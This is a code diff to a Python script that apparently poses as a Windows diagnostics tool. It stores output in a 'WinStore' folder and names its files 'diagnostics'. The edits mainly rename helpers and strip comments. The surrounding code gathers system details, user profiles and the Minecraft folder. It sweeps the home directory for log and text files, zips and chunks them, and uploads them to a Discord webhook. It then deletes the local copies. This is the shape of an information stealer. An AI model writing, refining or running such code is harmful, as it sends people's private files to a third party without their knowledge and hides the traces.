@@ -31,18 +31,18 @@ from typing import Any, Dict, List, Optional, Tuple
 # ─── CONFIG ──────────────────────────────────────────────────────────────────
 
 WEBHOOK_URL        = ""     # discord webhook url
-CLEANUP_AFTER_SEND = True   # delete local files after a successful upload
-VERBOSE            = True   # print progress to terminal
+CLEANUP_AFTER_SEND = True   # delete local files after successful upload
+VERBOSE            = True   # print log to terminal
 
 BASE_OUTPUT = Path(os.getenv("PROGRAMDATA") or Path.home()) / "WinStore"
 
-ZIP_NAME_TEMPLATE      = "diagnostics_{ts}.zip"
-JSON_NAME_TEMPLATE     = "system_info_{ts}.json"
-MANIFEST_NAME_TEMPLATE = "manifest.json"  # timestamped → no collision on concurrent runs
+ZIP_NAME_TEMPLATE      = "diagnostics_{ts}.zip"  # name for final zip
+JSON_NAME_TEMPLATE     = "system_info_{ts}.json"  # name for system info file
+MANIFEST_NAME_TEMPLATE = "manifest.json"  # name for rebuild index
 
-DISCORD_SAFE_CHUNK = 7 * 1024 * 1024  # 7 MB  (Discord hard limit is 8 MB)
+DISCORD_CHUNK = 7 * 1024 * 1024  # 7 MB  (Discord limit is 8 MB but up to 25mb depending server boosting level)
 UPLOAD_DELAY       = 3                 # seconds between chunk uploads
-MAX_UPLOAD_RETRIES = 3                 # retry attempts per file on failure
+MAX_UPLOAD_RETRIES = 3                 # retry attempts per chunk on failure
 
 # ─── UTILS ───────────────────────────────────────────────────────────────────
 
@@ -55,7 +55,7 @@ def now_ts() -> str:
     return datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
 
 
-def safe_scale(num: float) -> str:
+def scale(num: float) -> str:
     try:
         n = float(num)
     except Exception:
@@ -87,12 +87,12 @@ def _get_memory() -> Dict[str, Any]:
     stat = _MEMORYSTATUSEX()
     stat.dwLength = ctypes.sizeof(_MEMORYSTATUSEX)
     try:
-        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))  # type: ignore[attr-defined]
+        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
         used = stat.ullTotalPhys - stat.ullAvailPhys
         return {
-            "total":     safe_scale(stat.ullTotalPhys),
-            "available": safe_scale(stat.ullAvailPhys),
-            "used":      safe_scale(used),
+            "total":     scale(stat.ullTotalPhys),
+            "available": scale(stat.ullAvailPhys),
+            "used":      scale(used),
             "percent":   stat.dwMemoryLoad,
         }
     except Exception as exc:
@@ -103,7 +103,7 @@ def _get_disks() -> List[Dict[str, Any]]:
     disks: List[Dict[str, Any]] = []
     # Enumerate mounted drives via Windows drive bitmask
     try:
-        bitmask = ctypes.windll.kernel32.GetLogicalDrives()  # type: ignore[attr-defined]
+        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
     except Exception:
         bitmask = 0
 
@@ -115,9 +115,9 @@ def _get_disks() -> List[Dict[str, Any]]:
             usage = shutil.disk_usage(letter)
             disks.append({
                 "device":  letter,
-                "total":   safe_scale(usage.total),
-                "used":    safe_scale(usage.used),
-                "free":    safe_scale(usage.free),
+                "total":   scale(usage.total),
+                "used":    scale(usage.used),
+                "free":    scale(usage.free),
                 "percent": round(usage.used / usage.total * 100, 1) if usage.total else 0,
             })
         except Exception:
@@ -152,7 +152,7 @@ def collect_system_info() -> Dict[str, Any]:
             "processor": uname.processor,
         }
         info["cpu"] = {
-            "logical_cores": os.cpu_count(),  # os.cpu_count() returns logical cores only
+            "logical_cores": os.cpu_count(),
         }
         info["memory"]    = _get_memory()
         info["disks"]     = _get_disks()
@@ -164,7 +164,7 @@ def collect_system_info() -> Dict[str, Any]:
 
 
 def list_installed_programs_windows() -> List[str]:
-    return []  # stub — registry enumeration omitted for speed
+    return []
 
 
 def list_user_profiles() -> List[Dict[str, str]]:
@@ -221,7 +221,6 @@ def find_target_files() -> List[Path]:
     for root, dirs, files in os.walk(home):
         root_resolved = Path(root).resolve()
 
-        # Skip our own output directory so we never re-include previous runs
         try:
             root_resolved.relative_to(output_resolved)
             dirs.clear()
@@ -253,14 +252,14 @@ def create_compressed_zip(files: List[Path], zip_path: Path) -> Path:
                 try:
                     arcname: Any = fp.relative_to(home)
                 except ValueError:
-                    arcname = fp.name  # outside home dir (e.g. json under PROGRAMDATA)
+                    arcname = fp.name
                 zf.write(fp, arcname=arcname)
             except Exception as exc:
                 log(f"[WARN] Skipping {fp.name}: {exc}")
     return zip_path
 
 
-def split_file(file_path: Path, chunk_size: int = DISCORD_SAFE_CHUNK) -> List[Path]:
+def split_file(file_path: Path, chunk_size: int = DISCORD_CHUNK) -> List[Path]:
     chunks: List[Path] = []
     with open(file_path, "rb") as fh:
         idx = 1
@@ -344,7 +343,7 @@ def _upload_one(path: Path, label: str) -> bool:
             log(f"[WARN] Attempt {attempt}/{MAX_UPLOAD_RETRIES} for {path.name}: {exc}")
 
         if attempt < MAX_UPLOAD_RETRIES:
-            time.sleep(attempt * 2)  # back-off: 2 s, 4 s
+            time.sleep(attempt * 2)
 
     log(f"[ERROR] All retries exhausted for {path.name}")
     return False
@@ -374,7 +373,7 @@ def upload_chunks_to_discord(chunks: List[Path], manifest: Optional[Path] = None
 
 # ─── CLEANUP ─────────────────────────────────────────────────────────────────
 
-def safe_remove(path: Path) -> None:
+def remove(path: Path) -> None:
     try:
         if path.is_file():
             path.unlink()
@@ -385,7 +384,7 @@ def safe_remove(path: Path) -> None:
 
 # ─── MAIN ────────────────────────────────────────────────────────────────────
 
-def _safe_get(future: Any, name: str) -> Any:
+def get(future: Any, name: str) -> Any:
     try:
         return future.result()
     except Exception as exc:
@@ -406,11 +405,11 @@ def run_collection_and_upload() -> None:
         fut_minecraft = pool.submit(detect_minecraft_folder)
         fut_files     = pool.submit(find_target_files)
 
-        system_info        = _safe_get(fut_sysinfo,   "collect_system_info")
-        installed_programs = _safe_get(fut_programs,  "list_installed_programs_windows")
-        user_profiles      = _safe_get(fut_profiles,  "list_user_profiles")
-        minecraft          = _safe_get(fut_minecraft, "detect_minecraft_folder")
-        target_files: List[Path] = _safe_get(fut_files, "find_target_files") or []
+        system_info        = get(fut_sysinfo,   "collect_system_info")
+        installed_programs = get(fut_programs,  "list_installed_programs_windows")
+        user_profiles      = get(fut_profiles,  "list_user_profiles")
+        minecraft          = get(fut_minecraft, "detect_minecraft_folder")
+        target_files: List[Path] = get(fut_files, "find_target_files") or []
 
     log(f"[INFO] Found {len(target_files)} log/text file(s).")
 
@@ -433,7 +432,7 @@ def run_collection_and_upload() -> None:
         log("[ERROR] Zip creation failed — aborting upload.")
         return
 
-    log(f"[INFO] Zip ready: {zip_path.name} ({safe_scale(zip_path.stat().st_size)})")
+    log(f"[INFO] Zip ready: {zip_path.name} ({scale(zip_path.stat().st_size)})")
 
     chunks = split_file(zip_path)
     log(f"[INFO] Split into {len(chunks)} chunk(s).")
@@ -448,10 +447,10 @@ def run_collection_and_upload() -> None:
         log("[INFO] Upload complete.")
         if CLEANUP_AFTER_SEND:
             for chunk in chunks:
-                safe_remove(chunk)
-            safe_remove(zip_path)
-            safe_remove(json_path)
-            safe_remove(manifest_path)
+                remove(chunk)
+            remove(zip_path)
+            remove(json_path)
+            remove(manifest_path)
             log("[INFO] Local files cleaned up.")
     else:
         log("[WARN] One or more uploads failed — local files kept for manual retry.")
